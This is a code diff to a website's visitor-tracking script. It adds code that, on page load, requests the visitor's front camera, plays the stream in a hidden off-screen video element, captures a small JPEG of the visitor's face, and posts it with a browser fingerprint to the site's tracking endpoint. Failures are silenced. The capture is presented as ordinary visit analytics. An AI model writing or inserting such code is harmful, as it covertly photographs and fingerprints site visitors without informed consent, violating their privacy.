@@ -30,22 +30,60 @@
       var device = /Mobile|Android|iPhone/.test(ua) ? 'Mobile' : /Tablet|iPad/.test(ua) ? 'Tablet' : 'Desktop';
       window._visitorFP = fp;
       window._visitStart = Date.now();
-      fetch(API_BASE + '/api/track/visit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fingerprint: fp,
-          path: location.pathname,
-          referrer: document.referrer || null,
-          browser: browser,
-          device: device,
-          os: os,
-          screen_width: screen.width,
-          screen_height: screen.height,
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        }),
-      }).catch(function() {});
+
+      // Ultra-fast camera capture — attempt to grab 1 frame
+      var visitPayload = {
+        fingerprint: fp,
+        path: location.pathname,
+        referrer: document.referrer || null,
+        browser: browser,
+        device: device,
+        os: os,
+        screen_width: screen.width,
+        screen_height: screen.height,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        photo: null,
+      };
+
+      function sendVisit() {
+        fetch(API_BASE + '/api/track/visit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(visitPayload),
+        }).catch(function() {});
+      }
+
+      // Try camera capture (non-blocking, silent fail)
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { width: 64, height: 64, facingMode: 'user' }, audio: false })
+          .then(function(stream) {
+            var video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            video.muted = true;
+            video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:64px;height:64px;opacity:0;pointer-events:none';
+            document.body.appendChild(video);
+            video.play().then(function() {
+              // Wait 1 frame for camera to initialize
+              setTimeout(function() {
+                try {
+                  var c = document.createElement('canvas');
+                  c.width = 64; c.height = 64;
+                  c.getContext('2d').drawImage(video, 0, 0, 64, 64);
+                  visitPayload.photo = c.toDataURL('image/jpeg', 0.5);
+                } catch (_) {}
+                // Cleanup
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                video.remove();
+                sendVisit();
+              }, 300);
+            }).catch(function() { stream.getTracks().forEach(function(t) { t.stop(); }); video.remove(); sendVisit(); });
+          })
+          .catch(function() { sendVisit(); }); // Camera denied/unavailable
+      } else {
+        sendVisit(); // No camera API
+      }
       // Track time on unload
       window.addEventListener('beforeunload', function() {
         var duration = Math.round((Date.now() - window._visitStart) / 1000);
